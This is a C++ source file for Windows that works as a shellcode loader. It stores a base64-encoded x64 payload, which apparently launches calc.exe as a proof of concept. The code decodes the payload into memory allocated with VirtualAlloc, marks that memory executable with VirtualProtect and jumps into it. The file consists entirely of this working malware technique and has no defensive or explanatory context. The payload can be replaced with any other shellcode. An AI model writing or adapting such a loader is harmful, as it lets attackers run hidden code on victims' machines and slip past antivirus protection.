#include <Windows.h>
#include <wincrypt.h>
#include <iostream>

#pragma comment(lib, "Crypt32.lib")

BOOL Return = FALSE;
PVOID Buff = nullptr;
const UCHAR sc[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

INT b64decode(const PBYTE Src, UINT SrcLen, PCHAR Dest, UINT DestLen)
{
	BOOL Ret = FALSE;
	DWORD LenOut = DestLen;

	Ret = CryptStringToBinaryA((LPCSTR)Src, SrcLen, CRYPT_STRING_BASE64, (PBYTE)Dest, &LenOut, NULL, NULL);
	if (!Ret)
	{
		std::cout << "Base64 Decoding Error: " << GetLastError();
	}

	return LenOut;
}

INT scrun()
{
	Buff = VirtualAlloc(NULL, sizeof(sc), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!Buff)
	{
		std::cout << "Memory Allocation Error: " << GetLastError();
		return 1;
	}

	BOOL b64Ret = b64decode((const PBYTE)sc, (UINT)sizeof(sc), (PCHAR)Buff, (UINT)sizeof(sc));
	if (!b64Ret)
	{
		std::cout << "Error in b64decode: " << GetLastError();
	}

	DWORD OldProtect = 0;
	Return = VirtualProtect(Buff, sizeof(Buff), PAGE_EXECUTE_READ, &OldProtect);

	if (!Return)
	{
		std::cout << "Memory protection error: " << GetLastError();
		return 1;
	}

	(*(int(*)()) Buff)();


}